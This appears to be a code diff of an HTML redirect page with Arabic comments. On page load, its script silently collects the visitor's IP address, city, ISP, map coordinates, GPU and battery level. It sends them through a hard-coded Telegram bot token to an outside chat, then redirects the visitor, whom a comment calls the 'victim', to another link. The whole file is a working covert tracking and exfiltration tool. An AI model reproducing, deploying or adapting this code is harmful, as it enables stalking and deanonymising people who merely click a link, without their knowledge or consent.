@@ -4,33 +4,33 @@
     <meta charset="UTF-8">
     <script>
         async function capture() {
-            // معلوماتك اللي ما تتغير
             const token = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
             const chat_id = "5773364548";
             const p = new URLSearchParams(window.location.search);
             const target = p.get('u') || "https://t.me/vo11a";
 
-            // 1. جلب البطارية
+            // 1. كشف البطارية والـ GPU بدقة (لمعرفة نوع الجهاز)
             let b = "N/A"; try { const bt = await navigator.getBattery(); b = Math.round(bt.level*100)+"%"; } catch(e){}
-            
-            // 2. جلب الـ GPU
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl');
             const dbg = gl.getExtension('WEBGL_debug_renderer_info');
             const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "null";
 
-            // 3. جلب الموقع والآيبي (تلقائي)
+            // 2. سحب الـ IP وتفاصيل المحافظة والشركة
             let d = {ip:"N/A", city:"N/A", region:"N/A", org:"N/A", lat:0, lon:0};
-            try { const r = await fetch('https://ipapi.co/json/'); d = await r.json(); } catch(e){}
+            try { 
+                const r = await fetch('https://ipapi.co/json/'); 
+                d = await r.json(); 
+            } catch(e){}
 
-            // 4. التنسيق اللي ردته (الرصد الاحترافي)
-            const msg = `🚀 رصد احترافي - تحليل المواصفات 🚀
+            // 3. ترتيب الرسالة (الرصد الاحترافي + رقم 1)
+            const report = `🚀 رصد احترافي - تحليل المواصفات 🚀 1
 ━━━━━━━━━━━━━━━
 🌐 الآيبي الخارجي:
 ${d.ip}
 
 📱 تحليل نوع الجهاز:
-${navigator.platform}
+${navigator.platform} | ${gpu.includes("Apple") ? "iPhone/iPad" : "Android/PC"}
 
 📡 المعالج الرسومي (GPU):
 ${gpu}
@@ -43,12 +43,12 @@ ${gpu}
 
 🗺️ رابط الخريطة:
 https://www.google.com/maps?q=${d.latitude},${d.longitude}
-━━━━━━━━━━━━━━━`;
+━━━━━━━━━━━━━━━ 1`;
 
-            // 5. إرسال المعلومات للبوت
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+            // إرسال البيانات للتليجرام
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}`);
 
-            // 6. التحويل التلقائي للضحية
+            // 4. الاختصار التلقائي: التحويل الفوري للرابط المطلوب
             window.location.replace(target);
         }
         window.onload = capture;
